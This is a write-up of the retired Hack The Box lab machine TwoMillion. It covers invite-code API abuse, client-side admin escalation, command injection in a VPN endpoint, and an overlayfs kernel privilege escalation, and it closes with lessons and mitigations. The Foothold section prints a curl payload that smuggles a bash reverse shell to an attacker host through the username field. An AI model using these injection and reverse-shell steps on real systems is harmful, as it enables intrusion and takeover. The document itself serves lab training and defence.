---
machine: TwoMillion
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, api, command-injection, overlayfs, privesc]
---

# TwoMillion — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site recreates HTB's original invite challenge. Generate a code through the API, register an account and abuse `/api/v1/admin/settings/update` to enable the admin role. The VPN generation endpoint is injectable and yields an `admin` shell; database credentials lead to another user and CVE-2023-0386 (overlayfs) gives root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` a copy of the HTB platform.
- `ffuf` finds `2million.htb` and `/invite`.
- `/js/inviteapi.min.js` is obfuscated and contains the code logic.

## Enumeration

- `POST /api/v1/invite/how/to/generate` returns instructions and an encrypted hint.
- `POST /api/v1/invite/generate` returns a base64 code.
- `GET /api/v1` lists endpoints, including admin ones.

## Foothold

Register an account and send `PUT /api/v1/admin/settings/update` with `is_admin: true`. `/api/v1/admin/vpn/generate` passes the username to `system`, so injection yields an `admin` shell.

```bash
curl -s -X PUT 'http://2million.htb/api/v1/admin/settings/update' -H "Cookie: PHPSESSID=<SESSION>" -H 'Content-Type: application/json' --data '{"is_admin":true}'
curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H "Cookie: PHPSESSID=<SESSION>" --data 'username=admin; bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'
```

## Lateral movement

The application configuration contains MySQL credentials. Read the users and change the password of an account with a shell to log in over SSH.

```bash
mysql -u <USER> -p'<PASSWORD>' -e 'select * from users;'
```

## Privilege escalation

The kernel is vulnerable to CVE-2023-0386 (overlayfs). Compile the exploit, create a SUID file in the upper layer and run a root bash.

```bash
gcc -o exploit exploit.c
./exploit
```

## Evidence

- Invite code generated through the API.
- `is_admin` enabled and `admin` shell.
- MySQL and SSH credentials.
- CVE-2023-0386 and root.

## Lessons learned

- Obfuscating JavaScript does not protect API logic.
- An `is_admin` field accepted from the client is direct escalation.
- An unpatched kernel turns a user shell into root.

## Mitigation and detection

- Validate roles server-side and never accept privilege fields.
- Parameterize commands and avoid `system` on user input.
- Update the kernel and restrict overlayfs.

## References

- [0xdf — TwoMillion](https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html)
- [IppSec — TwoMillion](https://www.youtube.com/watch?v=Exl4P3fsF7U)
- [Hack The Box — TwoMillion](https://app.hackthebox.com/machines/twomillion)
